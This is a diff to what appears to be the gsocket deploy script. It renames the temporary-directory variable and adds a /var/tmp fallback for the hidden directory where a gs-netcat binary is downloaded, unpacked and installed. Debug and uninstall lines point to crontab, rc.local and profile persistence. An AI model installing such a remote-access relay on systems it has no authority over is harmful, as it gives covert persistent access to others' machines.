@@ -65,7 +65,7 @@
 #       - See https://github.com/hackerschoice/gsocket-relay
 # GS_PORT=
 #       - Port for the GSRN-Server. Default is 443.
-# TMPDIR=
+# _GS_TMPDIR=
 #       - Guess what...
 
 # Global Defines
@@ -484,9 +484,9 @@ xmv() {
 
 clean_all()
 {
-	[[ "${#TMPDIR}" -gt 5 ]] && {
-		rm -rf "${TMPDIR:?}/"*
-		rmdir "${TMPDIR}"
+	[[ "${#_GS_TMPDIR}" -gt 5 ]] && {
+		rm -rf "${_GS_TMPDIR:?}/"*
+		rmdir "${_GS_TMPDIR}"
 	} &>/dev/null
 
 	ts_restore
@@ -585,11 +585,11 @@ init_dstbin()
 
 try_tmpdir()
 {
-	[[ -n $TMPDIR ]] && return # already set
+	[[ -n $_GS_TMPDIR ]] && return # already set
 
 	[[ ! -d "$1" ]] && return
 
-	[[ -d "$1" ]] && xmkdir "${1}/${2}" && TMPDIR="${1}/${2}"
+	[[ -d "$1" ]] && xmkdir "${1}/${2}" && _GS_TMPDIR="${1}/${2}"
 }
 
 try_encode()
@@ -900,9 +900,11 @@ mk_encode()
 
 init_setup()
 {
+	unset _GS_TMPDIR
 	[[ -n $TMPDIR ]] && try_tmpdir "${TMPDIR}" ".gs-${UID}"
 	try_tmpdir "/dev/shm" ".gs-${UID}"
 	try_tmpdir "/tmp" ".gs-${UID}"
+	try_tmpdir "/var/tmp" ".gs-${UID}"
 	try_tmpdir "${HOME}" ".gs"
 	try_tmpdir "$(pwd)" ".gs-${UID}"
 
@@ -920,8 +922,8 @@ init_setup()
 	command -v tar >/dev/null || errexit "Need tar. Try ${CM}apt install tar${CN}"
 	command -v gzip >/dev/null || errexit "Need gzip. Try ${CM}apt install gzip${CN}"
 
-	touch "${TMPDIR}/.gs-rw.lock" || errexit "FAILED. No temporary directory found for downloading package. Try setting TMPDIR="
-	rm -f "${TMPDIR}/.gs-rw.lock" 2>/dev/null
+	touch "${_GS_TMPDIR}/.gs-rw.lock" || errexit "FAILED. No temporary directory found for downloading package. Try setting TMPDIR="
+	rm -f "${_GS_TMPDIR}/.gs-rw.lock" 2>/dev/null
 
 	# Find out which directory is writeable
 	init_dstbin
@@ -950,7 +952,7 @@ init_setup()
 	# DEBUGF "RCLOCAL_LINE=${RCLOCAL_LINE}"
 	# DEBUGF "PROFILE_LINE=${PROFILE_LINE}"
 	# DEBUGF "CRONTAB_LINE=${CRONTAB_LINE}"
-	DEBUGF "TMPDIR=${TMPDIR}"
+	DEBUGF "_GS_TMPDIR=${_GS_TMPDIR}"
 	DEBUGF "DSTBIN=${DSTBIN}"
 }
 
@@ -1078,9 +1080,9 @@ uninstall()
 	uninstall_rmdir "${GS_PREFIX}${HOME}/.config"
 	uninstall_rmdir "/tmp/.gsusr-${UID}"
 
-	uninstall_rm "${TMPDIR}/${SRC_PKG}"
-	uninstall_rm "${TMPDIR}/._gs-netcat" # OLD
-	uninstall_rmdir "${TMPDIR}"
+	uninstall_rm "${_GS_TMPDIR}/${SRC_PKG}"
+	uninstall_rm "${_GS_TMPDIR}/._gs-netcat" # OLD
+	uninstall_rmdir "${_GS_TMPDIR}"
 
 	# Remove crontab
 	unset regex
@@ -1817,25 +1819,25 @@ install()
 	echo -e "--> Trying ${CG}${osarch}${CN}"
 	# Download binaries
 	echo -en "Downloading binaries.................................................."
-	dl "${src_pkg}" "${TMPDIR}/${src_pkg}"
+	dl "${src_pkg}" "${_GS_TMPDIR}/${src_pkg}"
 	OK_OUT
 
 	echo -en "Unpacking binaries...................................................."
 	if [[ "${src_pkg}" == *.tar.gz ]]; then
 		# Unpack (suppress "tar: warning: skipping header 'x'" on alpine linux
-		(cd "${TMPDIR}" && tar xfz "${src_pkg}" 2>/dev/null) || { FAIL_OUT "unpacking failed"; errexit; }
-		[[ -f "${TMPDIR}/._gs-netcat" ]] && rm -f "${TMPDIR}/._gs-netcat" # from docker???
+		(cd "${_GS_TMPDIR}" && tar xfz "${src_pkg}" 2>/dev/null) || { FAIL_OUT "unpacking failed"; errexit; }
+		[[ -f "${_GS_TMPDIR}/._gs-netcat" ]] && rm -f "${_GS_TMPDIR}/._gs-netcat" # from docker???
 		[[ -n $GS_USELOCAL_GSNC ]] && {
 			[[ -f "$GS_USELOCAL_GSNC" ]] || { FAIL_OUT "Not found: ${GS_USELOCAL_GSNC}"; errexit; }
-			xcp "${GS_USELOCAL_GSNC}" "${TMPDIR}/gs-netcat"
+			xcp "${GS_USELOCAL_GSNC}" "${_GS_TMPDIR}/gs-netcat"
 		}
 	else
-		mv "${TMPDIR}/${src_pkg}" "${TMPDIR}/gs-netcat"
+		mv "${_GS_TMPDIR}/${src_pkg}" "${_GS_TMPDIR}/gs-netcat"
 	fi
 	OK_OUT
 
 	echo -en "Copying binaries......................................................"
-	xmv "${TMPDIR}/gs-netcat" "$DSTBIN" || { FAIL_OUT; errexit; }
+	xmv "${_GS_TMPDIR}/gs-netcat" "$DSTBIN" || { FAIL_OUT; errexit; }
 	chmod 700 "$DSTBIN"
 	OK_OUT
 
@@ -1845,7 +1847,7 @@ install()
 		OK_OUT
 		return
 	fi
-	rm -f "${TMPDIR}/${src_pkg:?}"
+	rm -f "${_GS_TMPDIR}/${src_pkg:?}"
 }
 
 gs_start_systemd()
